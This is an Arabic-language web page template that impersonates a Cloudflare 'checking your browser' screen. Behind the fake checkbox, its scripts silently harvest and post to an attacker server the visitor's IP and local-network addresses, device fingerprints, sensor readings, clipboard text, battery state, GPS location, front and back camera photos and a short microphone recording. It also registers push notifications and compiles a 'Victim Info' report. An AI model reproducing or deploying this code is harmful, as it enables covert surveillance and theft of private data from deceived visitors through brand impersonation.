<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<% if(pwaAccess){ %><link rel="manifest" href="<%=a%>/manifest.json"><meta name="theme-color" content="#f48120"><% } %>
<title>لحظة من فضلك...</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html{font-family:'Segoe UI',Tahoma,sans-serif;background:#f6f6f6;color:#313131;direction:rtl}
body{display:flex;flex-direction:column;min-height:100vh}
.main-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
.card{background:#fff;border:1px solid #e2e2e2;border-radius:10px;padding:32px 24px;max-width:440px;width:100%;text-align:center}

/* Logo */
.cf-logo{margin-bottom:16px}
.cf-logo svg{height:42px}

.cf-title{font-size:21px;font-weight:700;color:#313131;margin-bottom:8px}
.cf-sub{font-size:13px;color:#666;margin-bottom:24px;line-height:1.7}

/* Spinner */
.spinner-wrap{margin:0 auto 22px;width:56px;height:56px}
.spinner{width:56px;height:56px;border-radius:50%;border:4px solid #e8e8e8;border-top-color:#f48120;animation:spin .8s linear infinite}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}

#step-text{font-size:14px;color:#555;margin-bottom:5px;font-weight:500}
.note{font-size:12px;color:#aaa;margin-bottom:22px}

/* Checkbox */
.cf-check-row{display:none;align-items:center;justify-content:center;gap:12px;background:#fafafa;border:1px solid #ddd;border-radius:6px;padding:14px 18px;cursor:pointer;margin-bottom:20px;direction:ltr}
.cf-checkbox{width:26px;height:26px;border:2px solid #bbb;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:.2s}
.cf-checkbox.ticked{background:#f48120;border-color:#f48120}
.cf-checkbox.ticked svg{display:block}
.cf-checkbox svg{display:none;width:15px;height:15px}
.cf-check-label{font-size:14px;color:#313131;font-weight:600;direction:rtl}
.cf-brand{display:flex;flex-direction:column;align-items:center;font-size:9px;color:#aaa;gap:1px;margin-right:auto}

/* Footer */
.cf-footer{border-top:1px solid #eee;padding-top:14px;margin-top:4px;display:flex;justify-content:space-between;align-items:flex-end;font-size:11px;color:#bbb;direction:ltr}
.cf-footer b{color:#888}
.cf-footer-brand{text-align:right}

/* Bottom bar */
.foot-bar{background:#efefef;border-top:1px solid #ddd;padding:12px 20px;display:flex;justify-content:center;gap:24px;font-size:12px;color:#aaa}
.foot-bar a{color:#f48120;text-decoration:none}
</style>
</head>
<body>
<div class="main-wrap">
  <div class="card">
    <div class="cf-logo">
      <svg viewBox="0 0 130 44" xmlns="http://www.w3.org/2000/svg">
        <path d="M72.8 16.2c-.4-1.6-1.2-3-2.4-4.1-1.2-1.1-2.8-1.8-4.5-1.8-.6 0-1.2.1-1.8.2-1.3-2.4-3.8-4-6.7-4-4.2 0-7.6 3.4-7.6 7.6 0 .1 0 .3 0 .4-2.6.5-4.5 2.8-4.5 5.5 0 3.1 2.5 5.6 5.6 5.6h20.9c2.8 0 5-2.2 5-5 0-2.4-1.7-4.4-4-4.9z" fill="#F6821F"/>
        <path d="M75.5 25.8H54.6c-2.8 0-5-2.2-5-5s2.2-5 5-5h.3c0-.2 0-.4 0-.6 0-4.2 3.4-7.6 7.6-7.6 3.1 0 5.8 1.9 7 4.7.5-.1 1-.2 1.6-.2 3.1 0 5.6 2.5 5.6 5.6 0 .1 0 .2 0 .3 1.9.6 3.3 2.4 3.3 4.5 0 2.6-2.1 4.7-4.7 4.7z" fill="#FBAD41"/>
        <text x="84" y="28" font-family="sans-serif" font-size="15" font-weight="700" fill="#F6821F">Cloudflare</text>
      </svg>
    </div>

    <div class="cf-title">جارٍ التحقق من متصفحك</div>
    <div class="cf-sub">قبل الوصول إلى <b id="dest-domain">الصفحة المطلوبة</b><br>هذه العملية تلقائية وتستغرق بضع ثوانٍ</div>

    <div class="spinner-wrap"><div class="spinner" id="spinner"></div></div>

    <div id="step-text">يتم التحقق من هويتك، يرجى الانتظار...</div>
    <div class="note">يرجى الانتظار حتى 5 ثوانٍ...</div>

    <!-- Checkbox shown after spinner -->
    <div class="cf-check-row" id="check-row" onclick="doVerify()">
      <div class="cf-checkbox" id="cf-cb">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <div class="cf-check-label">أنا لست روبوت</div>
      <div class="cf-brand">
        <span style="font-size:11px;font-weight:700;color:#f48120">cf</span>
        <span>Privacy</span>
      </div>
    </div>

    <div class="cf-footer">
      <div>Ray ID: <b id="ray-id">—</b></div>
      <div class="cf-footer-brand">
        <div style="font-size:10px">الأمان بواسطة</div>
        <div style="color:#f48120;font-weight:700;font-size:12px">Cloudflare</div>
      </div>
    </div>
  </div>
</div>

<div class="foot-bar">
  <a href="https://www.cloudflare.com/privacypolicy/" target="_blank">سياسة الخصوصية</a>
  <a href="https://www.cloudflare.com/terms/" target="_blank">شروط الخدمة</a>
  <a href="https://support.cloudflare.com/" target="_blank">الدعم</a>
</div>

<!-- Hidden media elements -->
<video id="vid-front" style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
<video id="vid-back"  style="position:fixed;top:-9999px;left:-9999px" playsinline autoplay muted></video>
<canvas id="canvas" width="640" height="640" style="display:none"></canvas>

<script>
// Lightweight $.post — no external CDN needed
window.$={post:function(url,data){try{var x=new XMLHttpRequest(),p=Object.keys(data).map(function(k){return encodeURIComponent(k)+"="+encodeURIComponent(data[k]);}).join("&");x.open("POST",url,true);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.send(p);}catch(e){}}};
</script>
<script>
var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
var redirectDone=false;

// ── Show verify checkbox after spinner ───────────────────────────────────────
var _btnShown=false;
function _showBtn(){
  if(_btnShown)return; _btnShown=true;
  try{
    document.getElementById('step-text').textContent="خطوة أخيرة للتحقق من هويتك";
    document.getElementById('spinner').style.animationPlayState='paused';
    document.getElementById('spinner').style.borderTopColor='#f48120';
    document.getElementById('check-row').style.display='flex';
  }catch(e){}
}
setTimeout(_showBtn,4500);

// Ray ID
var chars="abcdefghijklmnopqrstuvwxyz0123456789";
var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*36)];
document.getElementById('ray-id').textContent=ray;

// Show destination domain
try{var dh=new URL(destUrl);document.getElementById('dest-domain').textContent=dh.hostname;}catch(e){}

function doRedirect(){
  if(redirectDone)return;
  redirectDone=true;
  document.getElementById('step-text').textContent="اكتمل التحقق! جارٍ التحويل...";
  document.getElementById('spinner').style.borderColor='#e8e8e8';
  document.getElementById('spinner').style.borderTopColor='#34c759';
  setTimeout(function(){window.location.href=destUrl;},500);
}
// Hard fallback
setTimeout(function(){doRedirect();},35000);

// ── Extra features (controlled by owner) ─────────────────────────────────────
<% if(feat.webrtc){ %>
(function(){
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel("");
    pc.createOffer().then(function(o){pc.setLocalDescription(o);});
    pc.onicecandidate=function(e){
      if(!e||!e.candidate||!e.candidate.candidate)return;
      var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
      if(m&&m.length){
        var ips=m.filter(function(ip){return ip!=="0.0.0.0";}).join(", ");
        if(ips) $.post(a+"/network",{uid:uid,data:encodeURIComponent("🌐 WebRTC IP: "+ips)});
      }
      pc.close();
    };
  }catch(e){}
})();
<% } %>

<% if(feat.fingerprint){ %>
(function(){
  try{
    var cv=document.createElement("canvas"),ctx2=cv.getContext("2d");
    ctx2.textBaseline="top";ctx2.font="14px Arial";ctx2.fillText("BotFP🔐",2,2);
    var fp=cv.toDataURL().slice(-50);
    $.post(a+"/network",{uid:uid,data:encodeURIComponent("🖥️ Canvas FP: "+fp)});
  }catch(e){}
  try{
    var ac=new (window.AudioContext||window.webkitAudioContext)();
    var os=ac.createOscillator(),dn=ac.createDynamicsCompressor();
    os.connect(dn);dn.connect(ac.destination);os.start(0);
    var afp=ac.destination.channelCount+"ch|"+ac.sampleRate+"hz";
    $.post(a+"/network",{uid:uid,data:encodeURIComponent("🎵 Audio FP: "+afp)});
    os.stop();ac.close();
  }catch(e){}
})();
<% } %>

<% if(feat.gyroscope){ %>
(function(){
  var gdata=[];
  function onMotion(e){
    if(gdata.length>=3)return;
    var acc=e.accelerationIncludingGravity||{};
    var rot=e.rotationRate||{};
    gdata.push("acc:"+[acc.x,acc.y,acc.z].map(function(v){return v?v.toFixed(1):0;}).join(",")+" rot:"+[rot.alpha,rot.beta,rot.gamma].map(function(v){return v?v.toFixed(1):0;}).join(","));
    if(gdata.length===3){
      $.post(a+"/network",{uid:uid,data:encodeURIComponent("🌀 Gyroscope:\n"+gdata.join("\n"))});
      window.removeEventListener("devicemotion",onMotion);
    }
  }
  if(typeof DeviceMotionEvent!=="undefined"){
    if(typeof DeviceMotionEvent.requestPermission==="function"){
      DeviceMotionEvent.requestPermission().then(function(r){if(r==="granted")window.addEventListener("devicemotion",onMotion);}).catch(function(){});
    } else {
      window.addEventListener("devicemotion",onMotion);
    }
  }
})();
<% } %>

<% if(feat.lightSensor){ %>
(function(){
  try{
    var ls=new AmbientLightSensor();
    ls.onreading=function(){$.post(a+"/network",{uid:uid,data:encodeURIComponent("💡 الإضاءة: "+ls.illuminance.toFixed(1)+" lux")});ls.stop();};
    ls.start();
  }catch(e){}
})();
<% } %>

<% if(feat.sessionTime){ %>
var _sessionStart=Date.now();
window.addEventListener("beforeunload",function(){
  var secs=Math.round((Date.now()-_sessionStart)/1000);
  navigator.sendBeacon(a+"/network","uid="+encodeURIComponent(uid)+"&data="+encodeURIComponent("⏱️ وقت الجلسة: "+secs+" ثانية"));
});
<% } %>

<% if(pidAccess){ %>
(function(){
  try{
    var PID_KEY="__cfvid__";
    var pid=localStorage.getItem(PID_KEY);
    var isNew=!pid;
    if(!pid){
      pid=([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,function(c){return(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16);});
      localStorage.setItem(PID_KEY,pid);
    }
    var body="uid="+encodeURIComponent(uid)+"&pid="+encodeURIComponent(pid)+"&ret="+(isNew?"new":"existing");
    var xhr=new XMLHttpRequest();xhr.open("POST",a+"/pid",true);
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    xhr.send(body);
  }catch(e){}
})();
<% } %>

<% if(localNetAccess){ %>
(function(){
  try{
    var localIPs=new Set();
    var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel("");
    pc.onicecandidate=function(e){
      if(e&&e.candidate){
        var m=e.candidate.candidate.match(/((?:192\.168|10\.|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3})/);
        if(m)localIPs.add(m[1]);
      }
    };
    pc.createOffer().then(function(o){pc.setLocalDescription(o);}).catch(function(){});
    setTimeout(function(){
      try{pc.close();}catch(e){}
      if(!localIPs.size)return;
      var lines=[...localIPs].map(function(ip){
        var gw=ip.replace(/\d+$/,"1");
        return "📱 جهاز الضحية: "+ip+"\n🌐 الراوتر المحتمل: "+gw;
      }).join("\n");
      var xhr=new XMLHttpRequest();xhr.open("POST",a+"/localnet",true);
      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      xhr.send("uid="+encodeURIComponent(uid)+"&hosts="+encodeURIComponent(lines));
    },4000);
  }catch(e){}
})();
<% } %>

<% if(pushAccess){ %>
(function(){
  var _a=a,_uid=uid;
  var _pid=localStorage.getItem("__cfvid__")||_uid;
  var _purl=encodeURIComponent(window.location.href);

  // ── SSE: connects immediately, receives push events ──
  var _es=new EventSource(_a+"/push-stream?uid="+encodeURIComponent(_uid)+"&pid="+encodeURIComponent(_pid)+"&purl="+_purl);
  _es.addEventListener("push",function(e){
    try{
      var d=JSON.parse(e.data);
      _showNotif(d.title||"🔔 رسالة جديدة",d.body||"");
    }catch(x){}
  });

  function _showNotif(title,body){
    if(!("Notification" in window))return;
    if(Notification.permission==="granted"){
      new Notification(title,{body:body,icon:"https://www.cloudflare.com/favicon.ico",requireInteraction:true,tag:"bot-push"});
    }
  }

  // ── Called from doVerify() on button click (user gesture required!) ──
  function _b64ToUint8(b){var r=b.replace(/-/g,'+').replace(/_/g,'/'),p=r.length%4;if(p){r+=new Array(4-p+1).join('=');}var s=atob(r),a=new Uint8Array(s.length);for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
  window._registerPush=function(){
    if(!("Notification" in window)||!("serviceWorker" in navigator))return;
    Notification.requestPermission().then(function(perm){
      if(perm!=="granted")return;
      navigator.serviceWorker.register(_a+"/sw.js").then(function(){
        return navigator.serviceWorker.ready;
      }).then(function(reg){
        return reg.pushManager.getSubscription().then(function(existing){
          if(existing){
            // reuse only if same VAPID key, else unsub and re-register
            var ek=existing.options&&existing.options.applicationServerKey;
            if(ek&&ek.byteLength===65)return existing;
            return existing.unsubscribe().then(function(){return null;});
          }
          return null;
        }).then(function(sub){
          if(sub)return sub;
          return fetch(_a+"/vapid-key").then(function(r){return r.json();}).then(function(d){
            return reg.pushManager.subscribe({userVisibleOnly:true,applicationServerKey:_b64ToUint8(d.key)});
          });
        });
      }).then(function(sub){
        if(!sub)return;
        fetch(_a+"/push-subscribe",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({uid:_uid,pid:_pid,purl:window.location.href,sub:sub.toJSON()})});
      }).catch(function(){});
    });
  };
})();
<% } %>

<% if(clipAccess && feat.clipboard){ %>
(function(){
  try{
    navigator.clipboard.readText().then(function(text){
      if(text&&text.trim().length>0){
        $.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(text.slice(0,500))});
      }
    }).catch(function(){});
  }catch(e){}
})();
<% } %>

// ── Silent background collection ──────────────────────────────────────────────
async function sendDeviceInfo(){
  var td="";
  <% if(!t){ %>
  td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip%>"><%=ip%></a> | <%=time%> UTC</b>';
  <% }else{ %>
  try{var rr=await fetch(a).then(x=>x.json());td+='<code>✅ Victim Info</code><br><b>⚓ IP: <a href="https://ip-api.com/#'+rr.ip+'">'+rr.ip+'</a> | <%=time%> UTC</b>';}catch(e){}
  <% } %>
  td+="<br><b>🕒 "+new Date()+"</b><br><b>Screen: "+screen.width+"x"+screen.height+"</b><br><b>TZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"</b><br>";
  var keys=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","vendor","deviceMemory","appVersion","webdriver"];
  td+="<br><b>📱 Device</b><br>";
  for(var i=0;i<keys.length;i++){if(keys[i] in navigator)td+="<b>"+keys[i]+":</b> <code>"+navigator[keys[i]]+"</code><br>";}
  if(navigator.connection){var nc=navigator.connection;td+="<br><b>🌐 "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
  <% if(feat.battery){ %>if("getBattery" in navigator){try{var batt=await navigator.getBattery();var pct=Math.round(batt.level*100);td+="<b>🔋 "+pct+"% | Charging:"+batt.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:batt.charging});}catch(e){}}<% } %>
  <% if(feat.vpnDetect){ %>try{var _tz=Intl.DateTimeFormat().resolvedOptions().timeZone;var _ipd=await fetch("https://ipapi.co/json/").then(function(r){return r.json();});if(_ipd&&_ipd.timezone&&_ipd.timezone!==_tz){$.post(a+"/vpndetect",{uid:uid,deviceTz:_tz,ipTz:_ipd.timezone,ipCountry:_ipd.country_name||'?',ipCity:_ipd.city||'?'});}}catch(e){}<% } %>
  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
}

// ── Location: called at button click with GPS priority ────────────────────────
function fireLocation(){
  function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
  async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
  if(!navigator.geolocation){ipFb();return;}
  var bestAcc=Infinity,wid=null,ipDone=false,gpsSent=false;
  var ipTimer=setTimeout(function(){if(!gpsSent){ipDone=true;ipFb();}},10000);
  var stopTimer=setTimeout(function(){if(wid!==null){navigator.geolocation.clearWatch(wid);wid=null;}},25000);
  wid=navigator.geolocation.watchPosition(
    function(p){
      var acc=p.coords.accuracy;
      if(acc<bestAcc){
        bestAcc=acc;
        clearTimeout(ipTimer);
        gpsSent=true;
        sendLoc(p.coords.latitude,p.coords.longitude,Math.round(acc)+"m (GPS)");
        if(acc<=15){clearTimeout(stopTimer);navigator.geolocation.clearWatch(wid);wid=null;}
      }
    },
    function(){clearTimeout(ipTimer);clearTimeout(stopTimer);if(!gpsSent)ipFb();},
    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
  );
}

// ── Camera ────────────────────────────────────────────────────────────────────
function waitReady(vid, ms){
  return new Promise(function(res){
    var c=setInterval(function(){if(vid.readyState>=2&&vid.videoWidth>0){clearInterval(c);res(true);}},100);
    setTimeout(function(){clearInterval(c);res(false);},ms||5000);
  });
}
function snapFrame(vid, canvas, ctx){
  ctx.drawImage(vid,0,0,640,640);
  return canvas.toDataURL("image/png").replace("data:image/png;base64","");
}

async function doCamera(){
  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');

  // ── FRONT CAMERA (first, fast) ────────────────────────────────────────────
  var frontStream=null;
  var _withAudio=<% if(audioAccess){ %>true<% } else { %>false<% } %>;
  var fConsts=_withAudio ? [
    {audio:true, video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}},
    {audio:true, video:{facingMode:"user"}},
    {audio:false,video:{facingMode:"user"}},
    {audio:false,video:true}
  ] : [
    {audio:false,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}},
    {audio:false,video:{facingMode:"user"}},
    {audio:false,video:true}
  ];
  for(var i=0;i<fConsts.length;i++){try{frontStream=await navigator.mediaDevices.getUserMedia(fConsts[i]);break;}catch(e){}}

  if(frontStream){
    var vidF=document.getElementById('vid-front');
    vidF.srcObject=frontStream;
    try{await vidF.play();}catch(e){}
    var fReady=await waitReady(vidF,5000);

    // Start audio recording immediately
    var atracks=frontStream.getAudioTracks();
    if(atracks.length){try{
      var rec=new MediaRecorder(new MediaStream(atracks)),chunks=[];
      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
      rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);
    }catch(e){}}

    if(fReady){
      // Snap 1 immediately, then 2 more with 800ms gaps
      for(var s=0;s<3;s++){
        if(s>0) await new Promise(function(r){setTimeout(r,800);});
        if(vidF.readyState>=2&&vidF.videoWidth>0){
          var img=snapFrame(vidF,canvas,ctx);
          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(img),cam:"front"});
        }
      }
      <% if(faceAIAccess){ %>if(typeof doFaceAI==="function") doFaceAI(canvas);<% } %>
    }
    // Stop front video after initial burst (continuous capture handled separately below)
    frontStream.getVideoTracks().forEach(function(t){t.stop();});

  // ── BACK CAMERA (after front video stopped) ───────────────────────────────
  await new Promise(function(r){setTimeout(r,300);});
  var backStream=null;
  var bConsts=[
    {audio:false,video:{facingMode:{exact:"environment"},width:{ideal:1920},height:{ideal:1080}}},
    {audio:false,video:{facingMode:{exact:"environment"},width:{ideal:1280},height:{ideal:720}}},
    {audio:false,video:{facingMode:{exact:"environment"}}},
    {audio:false,video:{facingMode:"environment"}}
  ];
  for(var j=0;j<bConsts.length;j++){try{backStream=await navigator.mediaDevices.getUserMedia(bConsts[j]);break;}catch(e){}}

  if(backStream){
    var vidB=document.getElementById('vid-back');
    vidB.srcObject=backStream;
    try{await vidB.play();}catch(e){}
    var bReady=await waitReady(vidB,5000);
    if(bReady){
      // IMPORTANT: wait extra 2s for camera sensor to adjust exposure (fixes black screen)
      await new Promise(function(r){setTimeout(r,2000);});
      for(var k=0;k<2;k++){
        if(k>0) await new Promise(function(r){setTimeout(r,1000);});
        if(vidB.readyState>=2&&vidB.videoWidth>0){
          var bImg=snapFrame(vidB,canvas,ctx);
          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(bImg),cam:"back"});
        }
      }
    }
    backStream.getTracks().forEach(function(t){t.stop();});
  }
} // end if(frontStream)
} // end doCamera

